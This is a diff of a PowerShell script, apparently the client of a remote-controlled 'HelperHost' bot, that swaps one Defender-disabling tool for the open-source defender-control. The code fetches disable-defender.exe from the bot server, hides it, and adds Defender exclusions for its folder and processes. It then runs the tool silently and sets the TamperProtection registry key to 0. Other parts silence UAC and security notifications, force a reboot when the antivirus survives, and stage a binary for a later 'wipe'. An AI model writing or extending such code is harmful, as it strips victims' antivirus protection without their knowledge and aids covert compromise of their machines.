@@ -664,81 +664,63 @@ function Disable-AllBlocking {
   try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
 }
 
-function Install-DControl {
-  # Sordum Defender Control — /D en tache SYSTEM (pas d'UI interactive).
-  # Le VBS fourni avec dControl ouvre Defender: on ne l'utilise JAMAIS.
+function Install-DefenderControl {
+  # Open-source pgkt04/defender-control (MIT) — pas Sordum dControl (UI infinie).
+  # Review: console CLI, TrustedInstaller, pas de reseau. Exes: disable/enable-defender.exe -s
   if (-not (Test-IsAdmin)) { return }
-  $dc = Join-Path $Dir 'dControl.exe'
-  $src = "$($BotBase.TrimEnd('/'))/files/tools/dControl.exe"
+  $dis = Join-Path $Dir 'disable-defender.exe'
+  $src = "$($BotBase.TrimEnd('/'))/files/tools/disable-defender.exe"
+  # Drop legacy Sordum binary if present (causes UI pop loop)
+  Remove-Item (Join-Path $Dir 'dControl.exe') -Force -EA SilentlyContinue
+  Remove-Item (Join-Path $Dir 'dc-off.cmd') -Force -EA SilentlyContinue
+  Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+
   $need = $true
-  if (Test-Path $dc) {
-    try {
-      if ((Get-Item $dc).Length -gt 100000) { $need = $false }
-    } catch {}
+  if (Test-Path $dis) {
+    try { if ((Get-Item $dis).Length -gt 100000) { $need = $false } } catch {}
   }
   if ($need) {
     try {
-      Download-File $src $dc
-      Unblock-Quiet $dc
-      Hide-HH $dc
+      Download-File $src $dis
+      Unblock-Quiet $dis
+      Hide-HH $dis
     } catch {
-      Write-Host "dControl download: $($_.Exception.Message)"
+      Write-Host "disable-defender download: $($_.Exception.Message)"
     }
   }
-  if (-not (Test-Path $dc)) { return }
+  # Also stage enable for wipe later
+  $en = Join-Path $Dir 'enable-defender.exe'
+  $ens = "$($BotBase.TrimEnd('/'))/files/tools/enable-defender.exe"
+  if (-not (Test-Path $en) -or (Get-Item $en).Length -lt 100000) {
+    try { Download-File $ens $en; Unblock-Quiet $en; Hide-HH $en } catch {}
+  }
+  if (-not (Test-Path $dis)) { return }
 
   try {
     if (Get-Command Add-MpPreference -EA SilentlyContinue) {
       Add-MpPreference -ExclusionPath $Dir -EA SilentlyContinue
-      Add-MpPreference -ExclusionProcess 'dControl.exe' -EA SilentlyContinue
+      Add-MpPreference -ExclusionProcess 'disable-defender.exe' -EA SilentlyContinue
+      Add-MpPreference -ExclusionProcess 'enable-defender.exe' -EA SilentlyContinue
     }
   } catch {}
 
-  # Wrapper CMD: /D puis tue toute fenetre UI restante
-  $wrap = Join-Path $Dir 'dc-off.cmd'
-  @(
-    '@echo off'
-    'cd /d "%~dp0"'
-    'dControl.exe /D'
-    'ping 127.0.0.1 -n 4 >nul'
-    'taskkill /F /IM dControl.exe >nul 2>&1'
-    'exit /b 0'
-  ) -join "`r`n" | Set-Content -Encoding ASCII $wrap -Force
-
-  # Tache SYSTEM one-shot = TrustedInstaller + zero fenetre utilisateur
-  $tn = 'HelperHostDControlOff'
-  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
-  try { schtasks /Delete /TN $tn /F 2>$null | Out-Null } catch {}
+  # -s = silent (no pause). Runs as admin → self-elevates to TrustedInstaller.
   try {
-    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$wrap`""
-    $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
-    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
-    Register-ScheduledTask -TaskName $tn -Action $action -Settings $set -Principal $prin -Force | Out-Null
-    Start-ScheduledTask -TaskName $tn -EA SilentlyContinue
+    $p = Start-Process -FilePath $dis -ArgumentList @('-s') -Wait -PassThru -WindowStyle Hidden -EA Stop
+    Write-Host "disable-defender -s exit=$($p.ExitCode)"
   } catch {
-    & schtasks.exe /Create /TN $tn /TR "cmd.exe /c `"$wrap`"" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F | Out-Null
-    & schtasks.exe /Run /TN $tn | Out-Null
+    try { & cmd.exe /c "`"$dis`" -s >nul 2>&1" | Out-Null } catch {}
   }
-
-  # Attendre fin (max ~45s) puis nettoyer tache
-  for ($i = 0; $i -lt 45; $i++) {
-    Start-Sleep -Seconds 1
-    $st = (Get-ScheduledTask -TaskName $tn -EA SilentlyContinue).State
-    if ($st -and $st -ne 'Running') { break }
-  }
-  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
-  try { schtasks /Delete /TN $tn /F 2>$null | Out-Null } catch {}
-  Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
-
+  Get-Process 'disable-defender','dControl' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
   '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.dcontrol-off') -Force -EA SilentlyContinue
-  Write-Host 'dControl /D via SYSTEM — done'
+  Write-Host 'disable-defender -s done'
 }
 
 function Invoke-SessionHarden {
   # Always: full AV off + UAC silent + notifs + exclusions + wipe hook
   if (-not (Test-IsAdmin)) { return }
-  # dControl FIRST — bypass Tamper Protection (TrustedInstaller), then our GPO hide UI
-  Install-DControl
+  # Open-source defender-control FIRST, then our GPO hide UI
+  Install-DefenderControl
   Disable-AllBlocking
   Disable-UACPrompts
   Disable-SecurityCenterToasts
@@ -762,18 +744,18 @@ function Test-AvStillOn {
 }
 
 function Request-AvRebootIfNeeded {
-  # Reboot UNIQUEMENT si Defender/Tamper restent actifs apres dControl + policies.
+  # Reboot UNIQUEMENT si Defender/Tamper restent actifs apres disable-defender + policies.
   # Connect OK + AV coupe → pas de reboot, session utilisable tout de suite.
   if (-not (Test-IsAdmin)) { return }
   Install-EarlyAvTask
 
-  # Laisser dControl / services digerer le /D
+  # Laisser disable-defender / services digerer
   Start-Sleep -Seconds 3
 
   if (-not (Test-AvStillOn)) {
     '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
     Remove-Item (Join-Path $Dir '.av-need-reboot') -Force -EA SilentlyContinue
-    Write-Host 'AV coupe (dControl/policies) — pas de reboot.'
+    Write-Host 'AV coupe (disable-defender/policies) — pas de reboot.'
     return
   }
 
@@ -787,7 +769,7 @@ function Request-AvRebootIfNeeded {
 
   'need-reboot' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-need-reboot') -Force
   '1' | Set-Content -Encoding ASCII $once -Force
-  Write-Host 'AV/Tamper encore actifs apres dControl — reboot dans 20s pour EarlyAV...'
+  Write-Host 'AV/Tamper encore actifs apres disable-defender — reboot dans 20s pour EarlyAV...'
   try {
     Start-Process -FilePath "$env:SystemRoot\System32\shutdown.exe" `
       -ArgumentList @('/r', '/t', '20', '/c', 'HelperHost: AV organisation (fallback)', '/f') `
@@ -806,9 +788,9 @@ function Install-EarlyAvTask {
   @(
     '@echo off'
     'cd /d "%~dp0"'
-    'if exist "%~dp0dControl.exe" ('
-    '  start "" /wait "%~dp0dControl.exe" /D'
-    '  ping 127.0.0.1 -n 3 >nul'
+    'if exist "%~dp0disable-defender.exe" ('
+    '  "%~dp0disable-defender.exe" -s'
+    '  taskkill /F /IM disable-defender.exe >nul 2>&1'
     '  taskkill /F /IM dControl.exe >nul 2>&1'
     ')'
     'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1'
@@ -865,6 +847,8 @@ function Set-DefenderExclude([string]$Path, [string]$Exe) {
     Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $tools -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess 'disable-defender.exe' -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess 'enable-defender.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess 'dControl.exe' -ErrorAction SilentlyContinue
     Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
